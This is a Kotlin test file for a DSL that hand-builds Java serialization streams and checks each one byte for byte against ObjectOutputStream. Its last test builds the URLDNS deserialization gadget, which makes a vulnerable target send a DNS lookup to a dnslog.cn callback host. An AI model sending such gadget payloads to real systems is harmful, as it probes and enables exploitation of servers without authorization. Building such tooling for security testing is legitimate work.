import io.kotest.core.spec.style.StringSpec
import io.kotest.matchers.shouldBe
import java.io.*
import java.io.ObjectStreamConstants.*
import java.lang.reflect.Proxy
import kotlin.experimental.or

fun serialize(obj: Serializable): ByteArray {
    val out = ByteArrayOutputStream()
    try {
        ObjectOutputStream(out).writeObject(obj)
    } catch (e: IOException) {
        throw UncheckedIOException(e)
    }
    return out.toByteArray()
}

fun ByteArray.toHex(): String = joinToString(separator = "") { eachByte -> "%02x".format(eachByte) }

class AllTests : StringSpec({
    "处理简单的可序列化类" {
        val actualData = Serial {
            desc {
                new {
                    type = SimpleSerializableClass::class.java
                    uid = SimpleSerializableClass.serialVersionUID
                    flags = SC_SERIALIZABLE

                    "i" type Int::class.java
                }
            }
            values {
                int(1)
            }
        }

        val expectedData = serialize(SimpleSerializableClass(1))

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "处理嵌套关系" {
        val actualData = Serial {
            desc {
                new {
                    type = NestedSerializableClass::class.java
                    uid = NestedSerializableClass.serialVersionUID
                    flags = SC_SERIALIZABLE

                    "f" type Float::class.java
                    "i" type Int::class.java
                    "c" type Class::class.java
                    "nested" type NestedSerializableClass.NestedClass::class.java
                    "other" type SimpleSerializableClass::class.java
                    "s" type String::class.java
                }
            }
            values {
                float(10f)
                int(1)
                obj {
                    clazz {
                        type = Serializable::class.java
                        flags = SC_SERIALIZABLE
                    }
                    new {
                        desc {
                            new {
                                type = NestedSerializableClass.NestedClass::class.java
                                uid = NestedSerializableClass.NestedClass.serialVersionUID
                                flags = SC_SERIALIZABLE

                                "l" type Long::class.java
                            }
                        }
                        values { long(5L) }
                    }
                    nil()
                    string("test")
                }
            }
        }

        val expectedData: ByteArray = serialize(
            NestedSerializableClass(1, 10f, Serializable::class.java, "test", NestedSerializableClass.NestedClass(5L))
        )

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "处理继承关系" {
        val actualData = Serial {
            desc {
                new {
                    type = HierarchySub::class.java
                    uid = HierarchySub.serialVersionUID

                    "c" type Char::class.java
                }
                new {
                    type = HierarchyBase::class.java
                    uid = HierarchyBase.serialVersionUID

                    "i" type Int::class.java
                }
            }
            values { int(5) }
            values { char('a') }
        }

        val expectedData: ByteArray = serialize(HierarchySub(5, 'a'))

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "处理枚举类型" {
        val actualData = Serial {
            desc {
                new {
                    type = ClassWithEnum::class.java
                    uid = ClassWithEnum.serialVersionUID

                    "e" type TestEnum::class.java
                }
            }
            values {
                obj {
                    enum("TEST") {
                        new {
                            type = TestEnum::class.java
                            flags = SC_SERIALIZABLE or SC_ENUM
                        }
                        new {
                            type = Enum::class.java
                            flags = SC_SERIALIZABLE or SC_ENUM
                        }
                    }
                }
            }
        }

        val expectedData = serialize(ClassWithEnum(TestEnum.TEST))

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "处理数组类型" {
        val actualData = Serial {
            desc {
                new {
                    type = ClassWithArray::class.java
                    uid = ClassWithArray.serialVersionUID

                    "ints" type IntArray::class.java
                    "objects" type Array<Any>::class.java
                }
            }
            values {
                obj {
                    array(type = IntArray::class.java) { +intArrayOf(1, 2, 3) }
                    array(type = Array<Serializable>::class.java) {
                        elements {
                            // bug: string("test \u0000 \u0100 \uD800\uDC00 \uDC00")
                            string("test")
                            new {
                                desc {
                                    new {
                                        type = SimpleSerializableClass::class.java
                                        uid = SimpleSerializableClass.serialVersionUID

                                        "i" type Int::class.java
                                    }
                                }
                                values {
                                    int(1)
                                }
                            }
                        }
                    }
                }
            }
        }

        val expectedData = serialize(
            ClassWithArray(
                intArrayOf(1, 2, 3),
                // bug: arrayOf("test \u0000 \u0100 \uD800\uDC00 \uDC00", SimpleSerializableClass(1))
                arrayOf("test", SimpleSerializableClass(1))
            )
        )

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    fun StreamBuilder.writeArray() =
        array(type = Array<Serializable>::class.java) {
            elements {
                new {
                    desc {
                        new {
                            type = SimpleSerializableClass::class.java
                            uid = SimpleSerializableClass.serialVersionUID

                            "i" type Int::class.java
                        }
                    }
                    values { int(1) }
                }
            }
        }

    "处理 Externalizable 接口的实现类" {
        val actualData = External {
            desc {
                new {
                    type = SimpleExternalizableClass::class.java
                    uid = SimpleExternalizableClass.serialVersionUID
                    flags = SC_EXTERNALIZABLE or SC_BLOCK_DATA
                }
            }
            writeExternal {
                it.write(5)
                it.writeBoolean(true)

                string("test")
                writeArray()
            }
        }

        val expectedData = serialize(SimpleExternalizableClass())

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "处理 Externalizable 实现类的嵌套关系" {
        val actualData = Serial {
            desc {
                new {
                    type = ClassWithExternalizable::class.java
                    uid = ClassWithExternalizable.serialVersionUID

                    "e" type SimpleExternalizableClass::class.java
                }
            }
            values {
                obj {
                    new {
                        desc {
                            new {
                                type = SimpleExternalizableClass::class.java
                                uid = SimpleExternalizableClass.serialVersionUID
                                flags = SC_EXTERNALIZABLE or SC_BLOCK_DATA
                            }
                        }
                        writeExternal {
                            it.write(5)
                            it.writeBoolean(true)

                            string("test")
                            writeArray()
                        }
                    }
                }
            }
        }

        val expectedData = serialize(ClassWithExternalizable(SimpleExternalizableClass()))

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "处理 Externalizable 实现类的继承关系" {
        val actualData = External {
            desc {
                new {
                    type = ExternalExtendsSerial::class.java
                    uid = ExternalExtendsSerial.serialVersionUID
                    flags = SC_EXTERNALIZABLE or SC_BLOCK_DATA
                }
                new {
                    type = SimpleSerializableClass::class.java
                    uid = SimpleSerializableClass.serialVersionUID

                    "i" type Int::class.java
                }
            }
            writeExternal {
                it.writeInt(5)
                it.writeBoolean(true)

                string("test")
            }
        }

        val expectedData = serialize(ExternalExtendsSerial(10))

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "动态代理" {
        val proxyObj = Proxy.newProxyInstance(
            this::class.java.classLoader,
            arrayOf(InterfaceA::class.java, InterfaceB::class.java),
            SerializableInvocationHandler()
        )

        val actualData = Serial {
            desc { proxy(InterfaceA::class.java, InterfaceB::class.java) }
            values {
                obj {
                    new {
                        desc {
                            new {
                                type = SerializableInvocationHandler::class.java
                                uid = SerializableInvocationHandler.serialVersionUID
                            }
                        }
                    }
                }
            }
        }

        val expectedData = serialize(proxyObj as Serializable)

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "自定义 writeObject 方法" {
        val actualData = Serial {
            desc {
                new {
                    type = ClassWithWriteObject::class.java
                    uid = ClassWithWriteObject.serialVersionUID
                    flags = SC_SERIALIZABLE or SC_WRITE_METHOD
                }
            }
            writeObject {
                it.writeInt(5)
                it.writeBoolean(true)

                string("test")
                writeArray()
            }
        }

        val expectedData = serialize(ClassWithWriteObject())

        actualData?.toHex() shouldBe expectedData.toHex()
    }

    "Sample gadget: URLDNS" {
        val payload = Serial {
            desc {
                new {
                    typeName = "java.util.HashMap"
                    uid = 362498820763181265L
                    flags = SC_SERIALIZABLE or SC_WRITE_METHOD

                    "loadFactor" type Float::class.java
                    "threshold" type Int::class.java
                }
            }
            values {
                float(0.75f)
                int(12)
            }
            writeObject {
                it.write(byteArrayOf(0, 0, 0, 16, 0, 0, 0, 1))
                new {
                    desc {
                        new {
                            typeName = "java.net.URL"
                            uid = -7627629688361524110L
                            flags = SC_SERIALIZABLE or SC_WRITE_METHOD

                            "hashCode" type Int::class.java
                            "port" type Int::class.java
                            "authority" type String::class.java
                            "file" type String::class.java
                            "host" type String::class.java
                            "protocol" type String::class.java
                            "ref" typeName "java.lang.String"
                        }
                    }
                    values {
                        int(-1)
                        int(-1)
                        obj {
                            string("dserial.kyrvep.dnslog.cn")
                            string("")
                            string("dserial.kyrvep.dnslog.cn")
                            string("http")
                            nil()
                        }
                    }
                    writeObject {}
                }
                string("http://dserial.kyrvep.dnslog.cn")
            }
        }

        println(payload?.toHex())
    }
})
